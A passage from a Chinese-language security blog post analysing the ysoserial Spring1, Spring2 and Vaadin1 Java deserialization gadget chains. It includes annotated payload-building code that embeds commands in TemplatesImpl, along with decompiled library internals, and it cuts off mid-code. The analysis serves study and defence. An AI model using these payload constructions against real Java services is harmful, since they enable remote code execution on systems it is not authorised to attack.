class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mitp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Spring 核心包中的 <code>org.springframework.core.SerializableTypeWrapper$TypeProvider</code> 实现了 TypeProvider 接口，是一个可以被反序列化的类。反序列化时调用了 ReflectionUtils，先是 findMethod 返回 Method 对象然后紧接着调用 invokeMethod 进行反射调用（无参调用）。</p><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> 是 InvocationHandler 的实现类，实例化时接收一个 ObjectFactory 对象，并在 invoke 代理时调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用。</p><ul><li>使用 AnnotationInvocationHandler 代理，返回任意对象</li><li>使用 ObjectFactoryDelegatingInvocationHandler 代理 TypeProvider$getType 方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MethodInvokeTypeProvider</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MethodInvokeTypeProvider</span> <span class="keyword">implements</span> <span class="title class_">SerializableTypeWrapper</span>.TypeProvider &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableTypeWrapper.TypeProvider provider;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String methodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> index;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object result;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MethodInvokeTypeProvider</span><span class="params">(SerializableTypeWrapper.TypeProvider provider, Method method, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.provider = provider;</span><br><span class="line">        <span class="built_in">this</span>.methodName = method.getName();</span><br><span class="line">        <span class="built_in">this</span>.index = index;</span><br><span class="line">        <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Type <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !(<span class="built_in">this</span>.result <span class="keyword">instanceof</span> Type) &amp;&amp; <span class="built_in">this</span>.result != <span class="literal">null</span> ? ((Type[])((Type[])<span class="built_in">this</span>.result))[<span class="built_in">this</span>.index] : (Type)th</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getSource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        inputStream.defaultReadObject();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);</span><br><span class="line">        <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectFactoryDelegatingInvocationHandler</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ObjectFactoryDelegatingInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectFactory&lt;?&gt; objectFactory;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ObjectFactoryDelegatingInvocationHandler</span><span class="params">(ObjectFactory&lt;?&gt; objectFactory)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.objectFactory = objectFactory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用</span></span><br><span class="line">                <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var6.getTargetException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h2><blockquote><p>使用 spring-aop 的 JdkDynamicAopProxy 替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler</p></blockquote><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">SerializableTypeWrapper.MethodInvokeTypeProvider.readObject()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.findMethod()</span><br><span class="line">SerializableTypeWrapper.TypeProvider(Proxy).getType()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">HashMap.get()</span><br><span class="line">ReflectionUtils.invokeMethod()</span><br><span class="line">Method.invoke()</span><br><span class="line">Templates(Proxy).newTransformer()</span><br><span class="line">                        JdkDynamicAopProxy.invoke()</span><br><span class="line">                            AopUtils.invokeJoinpointUsingReflection()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/xtW6eHdnbGPrYyJ.png" ><p>ysoserial.payloads.Spring2#getObject 和 Spring1 的构造方式基本相同，这里用了 AdvisedSupport 实例化 JdkDynamicAopProxy 动态代理，在 MethodInvokeTypeProvider.readObject 中返回 TemplatesImpl 和方法 newTransformer，从而执行命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实例化 AdvisedSupport</span></span><br><span class="line">    <span class="type">AdvisedSupport</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">    as.setTargetSource(<span class="keyword">new</span> <span class="title class_">SingletonTargetSource</span>(templates));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 JdkDynamicAopProxy 动态代理，代理 Type 和 Templates（TemplatesImpl 父类）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Type</span> <span class="variable">typeTemplatesProxy</span> <span class="operator">=</span> Gadgets.createProxy(</span><br><span class="line">        (InvocationHandler) Reflections.getFirstCtor(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).newInstance(as),</span><br><span class="line">        Type.class,</span><br><span class="line">        Templates.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代理 TypeProvider 的 getType 方法，返回 typeTemplatesProxy 代理类</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(</span><br><span class="line">        Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy),</span><br><span class="line">        forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">mitp</span> <span class="operator">=</span> Reflections.createWithoutConstructor(forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用反射赋值，使用 typeProviderProxy 代理类 和 newTransformer 方法</span></span><br><span class="line">    Reflections.setFieldValue(mitp, <span class="string">&quot;provider&quot;</span>, typeProviderProxy);</span><br><span class="line">    Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mitp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用 AopUtils#invokeJoinpointUsingReflection() 方法反射调用对象的 method 方法并返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JdkDynamicAopProxy</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;  <span class="comment">// </span></span><br><span class="line">    Class&lt;?&gt; targetClass = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    Object var13;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) &#123;</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">var18</span> <span class="operator">=</span> <span class="built_in">this</span>.equals(args[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> var18;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) &#123;</span><br><span class="line">            <span class="type">Integer</span> <span class="variable">var17</span> <span class="operator">=</span> <span class="built_in">this</span>.hashCode();</span><br><span class="line">            <span class="keyword">return</span> var17;</span><br><span class="line">        &#125;</span><br><span class="line">        Object retVal;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp; method.getDeclaringClass().isAssignableFrom(Advised.class)) &#123;</span><br><span class="line">            retVal = AopUtils.invokeJoinpointUsingReflection(<span class="built_in">this</span>.advised, method, args);</span><br><span class="line">            <span class="keyword">return</span> retVal;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.advised.exposeProxy) &#123;</span><br><span class="line">            oldProxy = AopContext.setCurrentProxy(proxy);</span><br><span class="line">            setProxyContext = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        target = targetSource.getTarget();  <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (target != <span class="literal">null</span>) &#123;</span><br><span class="line">            targetClass = target.getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Object&gt; chain = <span class="built_in">this</span>.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);</span><br><span class="line">        <span class="keyword">if</span> (chain.isEmpty()) &#123;</span><br><span class="line">            retVal = AopUtils.invokeJoinpointUsingReflection(target, method, args); <span class="comment">// 反射调用对象的 method 方法</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">MethodInvocation</span> <span class="variable">invocation</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectiveMethodInvocation</span>(proxy, target, method, args, targetClass, chain);</span><br><span class="line">            retVal = invocation.proceed();</span><br><span class="line">        &#125;</span><br><span class="line">        Class&lt;?&gt; returnType = method.getReturnType();</span><br><span class="line">        <span class="keyword">if</span> (retVal != <span class="literal">null</span> &amp;&amp; retVal == target &amp;&amp; returnType.isInstance(proxy) &amp;&amp; !RawTargetAccess.class.isAssignableFrom(method.getDeclaringClass()))</span><br><span class="line">            retVal = proxy;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (retVal == <span class="literal">null</span> &amp;&amp; returnType != Void.TYPE &amp;&amp; returnType.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopInvocationException</span>(<span class="string">&quot;Null return value from advice does not match primitive return type for: &quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line">        var13 = retVal; <span class="comment">// 返回方法</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target != <span class="literal">null</span> &amp;&amp; !targetSource.isStatic()) &#123;</span><br><span class="line">            targetSource.releaseTarget(target);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (setProxyContext) &#123;</span><br><span class="line">            AopContext.setCurrentProxy(oldProxy);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> var13;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AopUtils</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeJoinpointUsingReflection</span><span class="params">(Object target, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectionUtils.makeAccessible(method);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(target, args); <span class="comment">// 反射调用</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var4.getTargetException();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopInvocationException</span>(<span class="string">&quot;AOP configuration seems to be invalid: tried calling method [&quot;</span> + method + <span class="string">&quot;] on target [&quot;</span> + target + <span class="string">&quot;]&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AopInvocationException</span>(<span class="string">&quot;Could not access method [&quot;</span> + method + <span class="string">&quot;]&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Vaddin1"><a href="#Vaddin1" class="headerlink" title="Vaddin1"></a>Vaddin1</h2><blockquote><p>Vaadin 是 Java Web 应用开发框架，用 Java 或 TypeScript 构建可伸缩的 UI，并使用集成的工具、组件和设计系统来更快地迭代、更好地设计和简化开发过程。<br>CC2 + CC5<br>使用 TemplatesImpl 承载恶意代码<br>通过动态代理 BadAttributeValueExpException 的反序列化触发</p></blockquote><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        PropertysetItem.toString()</span><br><span class="line">                PropertysetItem.getPropertyId()</span><br><span class="line">                    NestedMethodProperty.getValue()</span><br><span class="line">                        TemplatesImpl.getObjectPropertyValue()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/MJvkQ7gFzd3eA4x.png" ><p>ysoserial.payloads.Vaadin1#getObject 返回动态代理 BadAttributeValueExpException。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span> <span class="params">(String command)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 构造 TemplatesImpl 承载恶意指令</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">templ</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储 Property 属性值</span></span><br><span class="line">    <span class="type">PropertysetItem</span> <span class="variable">pItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertysetItem</span>();        </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造 NestedMethodProperty 承载 TemplatesImpl</span></span><br><span class="line">    NestedMethodProperty&lt;Object&gt; nmprop = <span class="keyword">new</span> <span class="title class_">NestedMethodProperty</span>&lt;Object&gt;(templ, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    pItem.addItemProperty (<span class="string">&quot;outputProperties&quot;</span>, nmprop);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 利用 BadAttributeValueExpException 的 val 字段承载 PropertysetItem</span></span><br><span class="line">    <span class="type">BadAttributeValueExpException</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue (b, <span class="string">&quot;val&quot;</span>, pItem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BadAttributeValueExpException.readObject 在反序列化时会调用对象的 toString 方法，这里即 PropertysetItem.toString，进一步触发 NestedMethodProperty.getValue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BadAttributeValueExpException</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();    <span class="comment">// 调用对象的 toString 方法</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PropertysetItem</span></span><br><span class="line"><span class="keyword">private</span> LinkedList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">LinkedList</span>(); <span class="comment">// 存储id</span></span><br><span class="line"><span class="keyword">public</span> Property <span class="title function_">getItemProperty</span><span class="params">(Object id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (Property)<span class="built_in">this</span>.map.get(id);  <span class="comment">// 获取属性</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">retValue</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">i</span> <span class="operator">=</span> <span class="built_in">this</span>.getItemPropertyIds().iterator();</span><br><span class="line">    <span class="keyword">while</span>(i.hasNext()) &#123;    <span class="comment">// 遍历 id</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">propertyId</span> <span class="operator">=</span> i.next();</span><br><span class="line">        retValue = retValue + <span class="built_in">this</span>.getItemProperty(propertyId).getValue <span class="comment">// 获取映射的 Property 属性对象，并调用其 getValue 方法</span></span><br><span class="line">        <span class="keyword">if</span> (i.hasNext()) &#123;</span><br><span class="line">            retValue = retValue + <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">addItemProperty</span><span class="params">(Object id, Property property)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (id == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Item property id can not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.map.containsKey(id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map.put(id, property); <span class="comment">// 添加属性</span></span><br><span class="line">        <span class="built_in">this</span>.list.add(id);</span><br><span class="line">        <span class="built_in">this</span>.fireItemPropertySetChange();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NestedMethodProperty</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">NestedMethodProperty</span><span class="params">(Object instance, String propertyName)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.instance = instance;   <span class="comment">// 对象实例</span></span><br><span class="line">    <span class="built_in">this</span>.initialize(instance.getClass(), propertyName); <span class="comment">// 属性值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="built_in">this</span>.instance;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span 